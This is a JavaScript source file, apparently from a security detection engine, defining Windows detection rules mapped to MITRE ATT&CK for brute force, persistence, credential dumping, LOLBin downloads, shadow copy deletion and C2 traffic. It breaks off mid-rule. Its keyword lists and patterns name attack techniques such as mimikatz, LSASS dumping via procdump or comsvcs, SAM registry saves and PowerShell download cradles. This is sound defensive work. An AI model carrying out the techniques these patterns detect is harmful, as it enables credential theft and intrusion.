    //    title       — base display name (no variant suffix)
    //    os          — 'windows' | 'linux' | 'any'
    //    severity    — critical | high | medium | low | informational
    //    category    — authentication | persistence | execution | …
    //    mitre       — { technique, name, tactic }
    //    tags        — array of ATT&CK tag strings
    //    riskScore   — 0-100 baseline risk
    //    match(e)    — single-event predicate → bool
    //    matchBatch? — whole-events predicate → array of detection objects | null
    //    narrative(e)— human-readable explanation string
    //    variants?   — array of { id, title, match } for grouping sub-rules
    // ════════════════════════════════════════════════════════════════
    const RULES = [

      // ── CREDENTIAL ACCESS ──────────────────────────────────────

      {
        id: 'CSDE-WIN-001', title: 'Windows Logon Failure',
        os: 'windows', severity: 'medium', category: 'authentication', logCategory: 'windows_auth',
        mitre: { technique: 'T1110', name: 'Brute Force', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110'],
        riskScore: 45,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          return eid === 4625 && (
            !e.Status ||
            ['0xC000006A','0xC0000064','0xC000006D','0xC000006C','FAILURE'].includes(e.Status)
          );
        },
        narrative: e => `Failed logon for "${e.user||'unknown'}" from ${e.srcIp||'unknown IP'} (LogonType ${e.LogonType||'?'}) — Status: ${e.Status||'FAILURE'}`,
        variants: [
          { id: 'CSDE-WIN-001-WP', title: 'Windows Logon Failure [Wrong Password]',
            match: e => parseInt(e.EventID,10)===4625 && e.Status==='0xC000006A' },
          { id: 'CSDE-WIN-001-UNK', title: 'Windows Logon Failure [Unknown User]',
            match: e => parseInt(e.EventID,10)===4625 && e.Status==='0xC0000064' },
          { id: 'CSDE-WIN-001-DIS', title: 'Windows Logon Failure [Account Disabled]',
            match: e => parseInt(e.EventID,10)===4625 && e.Status==='0xC0000072' },
        ],
      },

      {
        id: 'CSDE-WIN-002', title: 'Multiple Failed Logons — Brute Force (Same Account)',
        os: 'windows', severity: 'high', category: 'authentication', logCategory: 'windows_auth',
        // FIX v7: This rule is strictly per-user per-IP brute force (T1110.001).
        // Password spray (T1110.003) is handled by CSDE-WIN-025.
        mitre: { technique: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110.001'],
        riskScore: 70,
        match: () => false, // batch only
        matchBatch: (events) => {
          const fails = events.filter(e => parseInt(e.EventID,10) === 4625);
          if (fails.length < CFG.MIN_BRUTE_FORCE_COUNT) return null;

          // Group by user+srcIp — same user, same IP = brute force (not spray)
          const grouped = new Map();
          fails.forEach(e => {
            const u  = (e.user||'?').toLowerCase();
            const ip = e.srcIp||e.SourceIP||e.IpAddress||'?';
            const key = `${u}|${ip}`;
            if (!grouped.has(key)) grouped.set(key, []);
            grouped.get(key).push(e);
          });

          const results = [];
          grouped.forEach((evts, key) => {
            if (evts.length >= CFG.MIN_BRUTE_FORCE_COUNT) {
              const [user, srcIp] = key.split('|');
              const isCritical = evts.length >= 10;
              const times = evts.map(e=>new Date(e.timestamp||0).getTime()).filter(t=>t>0).sort();
              const spanMs = times.length>=2 ? times[times.length-1]-times[0] : 0;
              const ratePerMin = spanMs > 0 ? (evts.length/(spanMs/60000)).toFixed(1) : '?';
              results.push({
                id: `CSDE-WIN-002-${user}`,
                ruleId: 'CSDE-WIN-002', ruleName: 'Multiple Failed Logons — Brute Force (Same Account)',
                severity: isCritical ? 'critical' : 'high',
                user, computer: evts[0].computer || '', srcIp,
                count: evts.length,
                mitre: { technique: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'credential-access' },
                tags: ['attack.credential_access', 'attack.t1110.001'],
                riskScore: Math.min(40 + evts.length * 10, 95),
                evidence: evts,
                narrative: `${evts.length} failed logon attempts for "${user}" from ${srcIp} ` +
                           `(rate: ${ratePerMin}/min) — targeted brute-force attack (T1110.001)`,
                timestamp: evts[0].timestamp,
                bruteMeta: { user, srcIp, attempts: evts.length, spanMs, ratePerMin },
              });
            }
          });
          return results.length ? results : null;
        },
        narrative: () => '',
      },

      {
        id: 'CSDE-WIN-003', title: 'Successful Logon After Multiple Failures',
        os: 'windows', severity: 'critical', category: 'authentication', logCategory: 'windows_auth',
        mitre: { technique: 'T1110', name: 'Brute Force — Successful Compromise', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1110', 'attack.t1078'],
        riskScore: 92,
        match: () => false, // batch only
        matchBatch: (events) => {
          const fails   = events.filter(e => parseInt(e.EventID,10) === 4625);
          const success = events.filter(e => parseInt(e.EventID,10) === 4624);
          if (!fails.length || !success.length) return null;

          // ── TEMPORAL ORDERING ENFORCEMENT ────────────────────────────
          // Failures MUST precede the successful logon in time.
          // A success that has NO prior failures is NOT a brute-force success —
          // it's a normal logon and should be filtered out here.
          // Index fails by user AND by source IP, keeping timestamps
          const failByUser = new Map();
          const failBySrc  = new Map();
          fails.forEach(e => {
            const u  = (e.user||'?').toLowerCase();
            const s  = e.srcIp||e.SourceIP||e.IpAddress||'?';
            const ts = new Date(e.timestamp || 0).getTime();
            if (!failByUser.has(u)) failByUser.set(u, []);
            failByUser.get(u).push({ ...e, _ts: ts });
            if (!failBySrc.has(s)) failBySrc.set(s, []);
            failBySrc.get(s).push({ ...e, _ts: ts });
          });

          const results = [];
          success.forEach(s => {
            const successTs = new Date(s.timestamp || 0).getTime();
            const uKey      = (s.user||'?').toLowerCase();
            const srcKey    = s.srcIp||s.SourceIP||s.IpAddress||'?';

            // Find failures that are STRICTLY BEFORE this success timestamp
            const byUser = (failByUser.get(uKey) || []).filter(f => f._ts < successTs);
            const bySrc  = (failBySrc.get(srcKey) || []).filter(f => f._ts < successTs);

            // Require at least CFG.MIN_BRUTE_FORCE_COUNT prior failures
            const failCount = Math.max(byUser.length, bySrc.length);
            if (failCount < CFG.MIN_BRUTE_FORCE_COUNT) return; // not a brute-force success

            // Calculate temporal gap between last failure and success
            const lastFailTs = Math.max(
              ...byUser.map(f => f._ts), ...bySrc.map(f => f._ts), 0
            );
            const gapMs = successTs - lastFailTs;

            // Reject if success somehow precedes the last failure (data error)
            if (successTs > 0 && lastFailTs > 0 && gapMs < 0) return;

            results.push({
              id: `CSDE-WIN-003-${uKey}`,
              ruleId: 'CSDE-WIN-003', ruleName: 'Successful Logon After Multiple Failures',
              severity: 'critical',
              user: s.user, computer: s.computer || '', srcIp: s.srcIp||s.SourceIP||s.IpAddress||'',
              mitre: { technique: 'T1110', name: 'Brute Force → Valid Account', tactic: 'credential-access' },
              tags: ['attack.credential_access', 'attack.t1110', 'attack.t1078'],
              riskScore: 92,
              evidence: [...byUser.slice(0,3), s],
              narrative: `Account "${s.user||'unknown'}" successfully logged in from ${s.srcIp||s.SourceIP||'unknown'} ` +
                         `AFTER ${failCount} failed attempt(s) ` +
                         (gapMs > 0 ? `(${Math.round(gapMs/1000)}s after last failure) ` : '') +
                         `— credential compromise confirmed (T1110 → T1078).`,
              timestamp: s.timestamp,
              // Preserve failure events for correlation engine to build the chain correctly
              _failureTimestamps: byUser.slice(0,5).map(f => f.timestamp),
              _successTimestamp : s.timestamp,
              _priorFailureCount: failCount,
              _gapMs: gapMs,
            });
          });
          return results.length ? results : null;
        },
        narrative: () => '',
      },

      // ── PERSISTENCE / ACCOUNT MANIPULATION ──────────────────────

      {
        id: 'CSDE-WIN-004', title: 'New User Account Created via net.exe',
        os: 'windows', severity: 'critical', category: 'persistence',
        mitre: { technique: 'T1136.001', name: 'Create Account: Local Account', tactic: 'persistence' },
        tags: ['attack.persistence', 'attack.t1136.001', 'attack.t1078'],
        riskScore: 95,
        match: e => {
          const proc = (e.process || e.ProcessName || e.Image || '').toLowerCase();
          const cmd  = (e.commandLine || '').toLowerCase();
          return parseInt(e.EventID,10) === 4688 &&
                 (proc.includes('net.exe') || proc.includes('net1.exe') || cmd.startsWith('net ')) &&
                 cmd.includes('user') &&
                 (cmd.includes('/add') || / add\b/.test(cmd));
        },
        narrative: e => `New user account created via "${e.commandLine||'net user'}" on ${e.computer||'unknown'} by ${e.user||'unknown'} — attacker establishing persistence backdoor`,
        variants: [
          { id: 'CSDE-WIN-004-NET', title: 'New User Account Created via net.exe [net user /add]',
            match: e => {
              const cmd = (e.commandLine||'').toLowerCase();
              return parseInt(e.EventID,10)===4688 && cmd.includes('net ') && cmd.includes('user') && cmd.includes('/add');
            }},
          { id: 'CSDE-WIN-004-NET1', title: 'New User Account Created via net.exe [net1 variant]',
            match: e => {
              const proc = (e.process||e.ProcessName||e.Image||'').toLowerCase();
              return parseInt(e.EventID,10)===4688 && proc.includes('net1.exe');
            }},
        ],
      },

      {
        id: 'CSDE-WIN-004B', title: 'User Added to Privileged Group',
        os: 'windows', severity: 'critical', category: 'persistence',
        mitre: { technique: 'T1098.001', name: 'Account Manipulation: Additional Cloud Credentials', tactic: 'persistence' },
        tags: ['attack.persistence', 'attack.t1098'],
        riskScore: 90,
        match: e => {
          const cmd = (e.commandLine||'').toLowerCase();
          return parseInt(e.EventID,10) === 4688 &&
                 (e.EventID === 4728 || e.EventID === 4732 || e.EventID === 4756 ||
                  (cmd.includes('net ') && cmd.includes('localgroup') && (cmd.includes('administrators') || cmd.includes('/add'))));
        },
        narrative: e => `User added to privileged group via "${e.commandLine||'net localgroup'}" on ${e.computer||'unknown'} — privilege escalation path`,
      },

      {
        id: 'CSDE-WIN-005', title: 'net.exe Reconnaissance Execution',
        os: 'windows', severity: 'medium', category: 'discovery',
        mitre: { technique: 'T1087.001', name: 'Account Discovery: Local Account', tactic: 'discovery' },
        tags: ['attack.discovery', 'attack.t1087.001'],
        riskScore: 40,
        match: e => {
          const proc = (e.process || e.ProcessName || e.Image || '').toLowerCase();
          const cmd  = (e.commandLine || '').toLowerCase();
          return parseInt(e.EventID,10) === 4688 &&
                 (proc.endsWith('net.exe') || proc.endsWith('net1.exe') || cmd.match(/\bnet\s+(user|group|view|share|localgroup|use)\b/)) &&
                 !cmd.includes('/add');
        },
        narrative: e => `net.exe reconnaissance — command: "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
      },

      // ── LOCAL DATA STAGING ─────────────────────────────────────

      {
        id: 'CSDE-WIN-009', title: 'Local Data Staging',
        os: 'windows', severity: 'high', category: 'collection',
        mitre: { technique: 'T1074.001', name: 'Local Data Staging', tactic: 'collection' },
        tags: ['attack.collection', 'attack.t1074.001'],
        riskScore: 75,
        match: e => {
          const cmd = (e.commandLine || '').toLowerCase();
          const proc = (e.process || e.ProcessName || e.Image || '').toLowerCase();
          return parseInt(e.EventID,10) === 4688 && (
            proc.includes('7z') || proc.includes('winrar') || proc.includes('winzip') ||
            cmd.includes('compress') || cmd.includes('archive') ||
            (proc.includes('xcopy') && cmd.includes('/s')) ||
            (proc.includes('robocopy') && cmd.includes('/mir')) ||
            cmd.match(/\b(7z|rar|zip|xcopy|robocopy)\s/)
          );
        },
        narrative: e => `Data staging detected — "${e.commandLine||'?'}" on ${e.computer||'unknown'} by ${e.user||'?'}`,
        variants: [
          { id: 'CSDE-WIN-009-7Z',  title: 'Local Data Staging [7-Zip Compression]',
            match: e => parseInt(e.EventID,10)===4688 && (e.process||e.Image||'').toLowerCase().includes('7z') },
          { id: 'CSDE-WIN-009-RAR', title: 'Local Data Staging [WinRAR Compression]',
            match: e => parseInt(e.EventID,10)===4688 && (e.commandLine||'').toLowerCase().includes('winrar') },
          { id: 'CSDE-WIN-009-XCP', title: 'Local Data Staging [xcopy Bulk Copy]',
            match: e => parseInt(e.EventID,10)===4688 && (e.process||e.ProcessName||e.Image||'').toLowerCase().includes('xcopy') },
        ],
      },

      // ── LATERAL MOVEMENT ──────────────────────────────────────

      {
        id: 'CSDE-WIN-006', title: 'Network Logon from External Source',
        os: 'windows', severity: 'medium', category: 'lateral-movement',
        mitre: { technique: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', tactic: 'lateral-movement' },
        tags: ['attack.lateral_movement', 'attack.t1021.002'],
        riskScore: 35,
        match: e => {
          // Only fire for network logon (Type 3) from non-loopback external sources
          if (parseInt(e.EventID,10) !== 4624) return false;
          if (e.LogonType != 3 && e.LogonType !== '3') return false;
          const ip = e.srcIp || e.SourceIP || e.SourceIPAddress || e.IpAddress || '';
          // Skip localhost / empty IPs — these are system events, not lateral movement
          if (!ip || ip === '127.0.0.1' || ip === '::1' || ip === '-' || ip === 'localhost') return false;
          return true;
        },
        narrative: e => `Network logon (Type 3) for "${e.user||'unknown'}" from ${e.srcIp||'unknown'} on ${e.computer||'DC01'}`,
      },

      {
        id: 'CSDE-WIN-010', title: 'PsExec / Remote Command Execution',
        os: 'windows', severity: 'high', category: 'lateral-movement',
        mitre: { technique: 'T1569.002', name: 'System Services: Service Execution', tactic: 'lateral-movement' },
        tags: ['attack.lateral_movement', 'attack.t1569.002'],
        riskScore: 82,
        match: e => {
          const cmd  = (e.commandLine||'').toLowerCase();
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          return parseInt(e.EventID,10) === 4688 && (
            proc.includes('psexec') || cmd.includes('psexec') ||
            (proc.includes('paexec') || cmd.includes('paexec'))
          );
        },
        narrative: e => `PsExec / remote execution detected — "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
      },

      // ── EXECUTION ─────────────────────────────────────────────

      {
        id: 'CSDE-WIN-007', title: 'Suspicious Process via cmd.exe Parent',
        os: 'windows', severity: 'low', category: 'execution',
        mitre: { technique: 'T1059.003', name: 'Windows Command Shell', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1059.003'],
        riskScore: 30,
        match: e => {
          if (parseInt(e.EventID,10) !== 4688) return false;
          const parent = (e.parentProcess || e.ParentImage || e.ParentProcessName || '').toLowerCase();
          if (!parent.includes('cmd.exe')) return false;
          // Only alert on genuinely suspicious child processes — not benign system tools
          const proc = (e.process || e.ProcessName || e.Image || '').toLowerCase();
          const cmd  = (e.commandLine || '').toLowerCase();
          const BENIGN = ['conhost.exe', 'cmd.exe', 'ipconfig.exe', 'ping.exe', 'tracert.exe',
                          'tasklist.exe', 'systeminfo.exe', 'hostname.exe', 'whoami.exe',
                          'chcp.exe', 'find.exe', 'findstr.exe', 'more.exe', 'timeout.exe',
                          'tree.exe', 'cls', 'echo', 'pause', 'xcopy.exe', 'type', 'dir'];
          if (BENIGN.some(b => proc.endsWith(b))) return false;
          // Only fire for: powershell, wscript, cscript, rundll32, mshta, regsvr32,
          // net.exe with /add, reg.exe writes, encoded commands, or unknown executables
          const SUSPICIOUS = ['powershell', 'wscript', 'cscript', 'rundll32', 'mshta',
                              'regsvr32', 'bitsadmin', 'certutil', 'wmic', 'msiexec'];
          if (SUSPICIOUS.some(s => proc.includes(s))) return true;
          if (proc.includes('net.exe') || proc.includes('net1.exe')) {
            return cmd.includes('/add') || cmd.includes('localgroup') || cmd.includes('user ');
          }
          if (proc.includes('reg.exe')) {
            return cmd.includes('add') || cmd.includes('import') || cmd.includes('export');
          }
          // Unknown/unsigned process launched from cmd.exe with suspicious patterns
          return cmd.includes('-enc') || cmd.includes('http') || cmd.includes('download') ||
                 cmd.includes('invoke') || cmd.includes('bypass') || cmd.includes('hidden');
        },
        narrative: e => `Process "${e.process||e.ProcessName||'unknown'}" spawned by cmd.exe — command: ${e.commandLine||'?'}`,
      },

      {
        id: 'CSDE-WIN-008', title: 'PowerShell Encoded Command Execution',
        os: 'windows', severity: 'high', category: 'execution',
        mitre: { technique: 'T1059.001', name: 'PowerShell', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1059.001', 'attack.defense_evasion', 'attack.t1027'],
        riskScore: 80,
        match: e => {
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          return (proc.includes('powershell') || proc.includes('pwsh')) &&
                 (cmd.includes('-encodedcommand') || cmd.includes('-enc ') || / -e(nc?)?\s+[A-Za-z0-9+/]{20}/.test(cmd));
        },
        narrative: e => `PowerShell encoded command on ${e.computer||'unknown'} — obfuscation detected`,
        variants: [
          { id: 'CSDE-WIN-008-ENC', title: 'PowerShell Encoded Command Execution [-EncodedCommand]',
            match: e => (e.commandLine||'').toLowerCase().includes('-encodedcommand') },
          { id: 'CSDE-WIN-008-ENC2', title: 'PowerShell Encoded Command Execution [-enc short flag]',
            match: e => (e.commandLine||'').toLowerCase().includes('-enc ') },
        ],
      },

      {
        id: 'CSDE-WIN-011', title: 'LOLBIN — mshta.exe with Remote URL',
        os: 'windows', severity: 'high', category: 'execution',
        mitre: { technique: 'T1218.005', name: 'Signed Binary Proxy: Mshta', tactic: 'defense-evasion' },
        tags: ['attack.defense_evasion', 'attack.t1218.005'],
        riskScore: 78,
        match: e => {
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          return proc.includes('mshta') && (cmd.includes('http://') || cmd.includes('https://') || cmd.includes('ftp://'));
        },
        narrative: e => `mshta.exe loading remote script: "${e.commandLine||'?'}"`,
      },

      {
        id: 'CSDE-WIN-012', title: 'Certutil Used for File Download (LOLBin)',
        os: 'windows', severity: 'high', category: 'defense-evasion',
        mitre: { technique: 'T1105', name: 'Ingress Tool Transfer', tactic: 'command-and-control' },
        tags: ['attack.command_and_control', 'attack.t1105', 'attack.t1218.013'],
        riskScore: 76,
        match: e => {
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          return proc.includes('certutil') && (
            cmd.includes('-urlcache') || cmd.includes('-verifyctl') || cmd.includes('http')
          );
        },
        narrative: e => `certutil.exe file download — "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
      },

      {
        id: 'CSDE-WIN-013', title: 'Shadow Copy Deletion (Ransomware Indicator)',
        os: 'windows', severity: 'critical', category: 'impact', logCategory: 'windows_process_creation',
        mitre: { technique: 'T1490', name: 'Inhibit System Recovery', tactic: 'impact' },
        tags: ['attack.impact', 'attack.t1490'],
        riskScore: 98,
        match: e => {
          const cmd = (e.commandLine||'').toLowerCase();
          return parseInt(e.EventID,10) === 4688 && (
            (cmd.includes('vssadmin') && (cmd.includes('delete') || cmd.includes('resize'))) ||
            (cmd.includes('wmic') && cmd.includes('shadowcopy') && cmd.includes('delete')) ||
            (cmd.includes('bcdedit') && (cmd.includes('recoveryenabled') || cmd.includes('bootstatuspolicy')))
          );
        },
        narrative: e => `Shadow copy deletion / recovery inhibit — "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
      },

      {
        id: 'CSDE-WIN-014', title: 'LSASS / Credential Dump Attempt',
        os: 'windows', severity: 'critical', category: 'credential-access', logCategory: 'windows_process_creation',
        mitre: { technique: 'T1003.001', name: 'LSASS Memory', tactic: 'credential-access' },
        tags: ['attack.credential_access', 'attack.t1003.001'],
        riskScore: 97,
        match: e => {
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          return parseInt(e.EventID,10) === 4688 && (
            (proc.includes('procdump') && cmd.includes('lsass')) ||
            cmd.includes('sekurlsa') || cmd.includes('mimikatz') ||
            (cmd.includes('reg') && cmd.includes('save') && cmd.includes('sam')) ||
            (proc.includes('rundll32') && cmd.includes('comsvcs') && cmd.includes('minidump'))
          );
        },
        narrative: e => `Credential dump attempt — "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
        variants: [
          { id: 'CSDE-WIN-014-PROC', title: 'LSASS Credential Dump [ProcDump]',
            match: e => parseInt(e.EventID,10)===4688 && (e.commandLine||'').toLowerCase().includes('procdump') && (e.commandLine||'').toLowerCase().includes('lsass') },
          { id: 'CSDE-WIN-014-MIMI', title: 'LSASS Credential Dump [Mimikatz]',
            match: e => (e.commandLine||'').toLowerCase().includes('sekurlsa') || (e.commandLine||'').toLowerCase().includes('mimikatz') },
          { id: 'CSDE-WIN-014-REG',  title: 'LSASS Credential Dump [Registry SAM Save]',
            match: e => { const c=(e.commandLine||'').toLowerCase(); return c.includes('reg') && c.includes('save') && c.includes('sam'); }},
        ],
      },

      {
        id: 'CSDE-WIN-015', title: 'Scheduled Task Created for Persistence',
        os: 'windows', severity: 'high', category: 'persistence', logCategory: 'windows_process_creation',
        mitre: { technique: 'T1053.005', name: 'Scheduled Task/Job: Scheduled Task', tactic: 'persistence' },
        tags: ['attack.persistence', 'attack.t1053.005'],
        riskScore: 73,
        match: e => {
          const eid = parseInt(e.EventID,10);
          const cmd = (e.commandLine||'').toLowerCase();
          return eid === 4698 || eid === 4702 ||
                 (eid === 4688 && (cmd.includes('schtasks') || cmd.includes('at.exe')) && (cmd.includes('/create') || cmd.includes('/change')));
        },
        narrative: e => `Scheduled task created/modified — "${e.commandLine||e.TaskName||'?'}" on ${e.computer||'unknown'}`,
      },

      {
        id: 'CSDE-WIN-016', title: 'WMI Remote Execution',
        os: 'windows', severity: 'high', category: 'execution', logCategory: 'windows_process_creation',
        mitre: { technique: 'T1047', name: 'Windows Management Instrumentation', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1047'],
        riskScore: 77,
        match: e => {
          const proc = (e.process||e.Image||e.ProcessName||'').toLowerCase();
          const cmd  = (e.commandLine||'').toLowerCase();
          return parseInt(e.EventID,10) === 4688 && (
            proc.includes('wmic') || proc.includes('wbemcons') ||
            (cmd.includes('wmic') && (cmd.includes('process') || cmd.includes('call') || cmd.includes('create')))
          );
        },
        narrative: e => `WMI execution — "${e.commandLine||'?'}" on ${e.computer||'unknown'}`,
      },

      // ── ADDITIONAL WINDOWS RULES ─────────────────────────────

      {
        id: 'CSDE-WIN-017', title: 'PowerShell Spawned from Office/Browser (Spear Phishing)',
        os: 'windows', severity: 'critical', category: 'execution', logCategory: 'windows_process_creation',
        mitre: { technique: 'T1059.001', name: 'PowerShell', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1059.001', 'attack.t1566.001'],
        riskScore: 98,
        match: e => {
          const eid    = parseInt(e.EventID, 10);
          const proc   = (e.process || '').toLowerCase();
          const parent = (e.parentProcess || '').toLowerCase();
          const cmd    = (e.commandLine || '').toLowerCase();
          const officeParents = ['outlook.exe', 'winword.exe', 'excel.exe', 'powerpnt.exe', 'mspub.exe', 'visio.exe', 'onenote.exe', 'msaccess.exe'];
          const browserParents = ['chrome.exe', 'firefox.exe', 'iexplore.exe', 'msedge.exe', 'opera.exe'];
          const isOffice  = officeParents.some(p => parent.includes(p));
          const isBrowser = browserParents.some(p => parent.includes(p));
          return eid === 4688 && proc.includes('powershell') && (isOffice || isBrowser);
        },
        narrative: e => `PowerShell spawned from "${e.parentProcess||'?'}" — high-confidence spear-phishing indicator on ${e.computer||'unknown'}. Command: "${(e.commandLine||'?').slice(0,150)}"`,
        variants: [
          { id: 'CSDE-WIN-017-ENC', title: 'Encoded PowerShell from Office Parent',
            match: e => parseInt(e.EventID,10)===4688 && (e.process||'').toLowerCase().includes('powershell') &&
              (e.commandLine||'').toLowerCase().includes('-enc') &&
              ['outlook.exe','winword.exe','excel.exe','powerpnt.exe'].some(p => (e.parentProcess||'').toLowerCase().includes(p)) },
          { id: 'CSDE-WIN-017-HID', title: 'Hidden PowerShell from Office Parent',
            match: e => parseInt(e.EventID,10)===4688 && (e.process||'').toLowerCase().includes('powershell') &&
              (e.commandLine||'').match(/-w(indow)?\s+hid(den)?/i) &&
              ['outlook.exe','winword.exe','excel.exe'].some(p => (e.parentProcess||'').toLowerCase().includes(p)) },
        ],
      },

      {
        id: 'CSDE-WIN-018', title: 'Suspicious Script Block Execution (PowerShell EventID 4104)',
        os: 'windows', severity: 'high', category: 'execution', logCategory: 'windows_powershell',
        mitre: { technique: 'T1059.001', name: 'PowerShell', tactic: 'execution' },
        tags: ['attack.execution', 'attack.t1059.001'],
        riskScore: 80,
        match: e => {
          const eid  = parseInt(e.EventID, 10);
          const script = (e.ScriptBlockText || e.scriptBlock || e.message || '').toLowerCase();
          if (eid !== 4104) return false;
          // Suspicious patterns in PowerShell script blocks
          const SUSPICIOUS = [
            'invoke-webrequest', 'iwr ', 'wget ', 'downloadstring', 'downloadfile',
            'invoke-expression', 'iex(', '[system.net.webclient]', 'net.webclient',
            'bypass', '-encodedcommand', 'frombase64string', '-noprofile',
            'invoke-mimikatz', 'invoke-shellcode', 'invoke-ms16', 'invoke-exploit',
            'add-type', 'shellcode', 'virtualalloc', 'createthread',
          ];
          return SUSPICIOUS.some(s => script.includes(s));
        },
        narrative: e => `Malicious PowerShell script block logged (EventID 4104) on ${e.computer||'unknown'}. Script: "${(e.ScriptBlockText||'?').slice(0,200)}"`,
        variants: [
          { id: 'CSDE-WIN-018-DL', title: 'PowerShell Download Cradle in Script Block',
            match: e => parseInt(e.EventID,10)===4104 && ['invoke-webrequest','downloadstring','downloadfile','net.webclient'].some(s => (e.ScriptBlockText||e.scriptBlock||'').toLowerCase().includes(s)) },
          { id: 'CSDE-WIN-018-IEX', title: 'Invoke-Expression in Script Block',
            match: e => parseInt(e.EventID,10)===4104 && (e.ScriptBlockText||e.scriptBlock||'').toLowerCase().includes('invoke-expression') },
        ],
      },

      {
        id: 'CSDE-WIN-019', title: 'Service Installed in Suspicious Path (T1543.003)',
        os: 'windows', severity: 'critical', category: 'persistence', logCategory: 'windows_system',
        mitre: { technique: 'T1543.003', name: 'Windows Service', tactic: 'persistence' },
        tags: ['attack.persistence', 'attack.t1543.003'],
        riskScore: 92,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          if (eid !== 7045 && eid !== 4697) return false;
          const imgPath = (e.ImagePath || e.ServiceFileName || e.message || '').toLowerCase();
          const suspPaths = ['\\temp\\', '\\tmp\\', '\\appdata\\', '\\downloads\\', '%temp%', '%appdata%', '\\users\\public\\', '\\recycle'];
          const suspExts  = ['.exe', '.dll', '.com', '.scr', '.vbs', '.ps1'];
          const inSuspPath = suspPaths.some(p => imgPath.includes(p));
          const hasSuspExt = suspExts.some(ext => imgPath.endsWith(ext));
          return inSuspPath || (hasSuspExt && !imgPath.includes('\\system32\\') && !imgPath.includes('\\syswow64\\') && !imgPath.includes('\\program files\\'));
        },
        narrative: e => `Suspicious service installed — Name: "${e.ServiceName||'?'}", Path: "${e.ImagePath||e.ServiceFileName||'?'}" on ${e.computer||'unknown'}`,
      },

      {
        id: 'CSDE-WIN-020', title: 'Admin Share Access / Lateral Movement via SMB',
        os: 'windows', severity: 'high', category: 'lateral-movement', logCategory: 'windows_security',
        // EventIDs 5140/5145 ARE in the windows_security range [5136,5145] — no change needed
        mitre: { technique: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', tactic: 'lateral-movement' },
        tags: ['attack.lateral_movement', 'attack.t1021.002'],
        riskScore: 72,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          if (eid !== 5140 && eid !== 5145) return false;
          const share = (e.ShareName || e.ObjectName || e.message || '').toUpperCase();
          const adminShares = ['ADMIN$', 'C$', 'D$', 'IPC$', 'SYSVOL', 'NETLOGON'];
          return adminShares.some(s => share.includes(s));
        },
        narrative: e => `Admin share accessed — "${e.ShareName||'?'}" from ${e.user||'unknown'} on ${e.computer||'unknown'}. Possible lateral movement.`,
        variants: [
          { id: 'CSDE-WIN-020-ADM', title: 'ADMIN$ Share Access',
            match: e => parseInt(e.EventID,10)===5140 && (e.ShareName||'').toUpperCase().includes('ADMIN$') },
          { id: 'CSDE-WIN-020-CSH', title: 'C$ Root Share Access (Lateral Movement)',
            match: e => parseInt(e.EventID,10)===5140 && /\\C\$|\\D\$/i.test(e.ShareName||'') },
        ],
      },

      {
        id: 'CSDE-WIN-021', title: 'Ransomware Indicator: Encrypted File Extension Created',
        os: 'windows', severity: 'critical', category: 'impact', logCategory: 'sysmon',
        mitre: { technique: 'T1486', name: 'Data Encrypted for Impact', tactic: 'impact' },
        tags: ['attack.impact', 'attack.t1486'],
        riskScore: 99,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          if (eid !== 11 && eid !== 4663) return false;
          const fname = (e.TargetFilename || e.ObjectName || e.message || '').toLowerCase();
          // Known ransomware extensions
          const ransomExts = ['.lockbit', '.locky', '.crypt', '.encrypted', '.locked', '.zzzzz', '.zepto', '.cerber', '.wncrypt', '.wanacry', '.ryuk', '.conti', '.revil', '.hive', '.blackcat', '.alphv'];
          return ransomExts.some(ext => fname.includes(ext));
        },
        narrative: e => `Ransomware file extension detected — "${e.TargetFilename||e.ObjectName||'?'}" on ${e.computer||'unknown'}. Possible active ransomware encryption.`,
      },

      {
        id: 'CSDE-WIN-022', title: 'C2 Network Connection (Process to External IP)',
        os: 'windows', severity: 'high', category: 'command-and-control', logCategory: 'sysmon',
        mitre: { technique: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', tactic: 'command-and-control' },
        tags: ['attack.command_and_control', 'attack.t1071.001'],
        riskScore: 85,
        match: e => {
          const eid = parseInt(e.EventID, 10);
          if (eid !== 3) return false;
          const proc   = (e.process || e.Image || '').toLowerCase();
          const destIp = e.DestinationIP || e.destIp || e.DestinationAddress || '';
          // External IP (not RFC1918 or loopback)
          const isPrivate = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|::1|0\.0\.0\.0)/.test(destIp);
          const isSuspProc = ['payload', 'beacon', 'agent', 'rat', 'stager', 'implant'].some(s => proc.includes(s)) ||
            // Any process that isn't a known browser/updater/system
            (!['chrome','firefox','edge','iexplore','updater','wuauclt','svchost','lsass'].some(s => proc.includes(s)) && destIp);
          return destIp && !isPrivate && isSuspProc;
        },
        narrative: e => `C2 network connection from "${e.process||e.Image||'?'}" to ${e.DestinationIP||'?'}:${e.DestinationPort||'?'} on ${e.computer||'unknown'}`,
        variants: [
          { id: 'CSDE-WIN-022-HTTPS', title: 'C2 via HTTPS (port 443)',
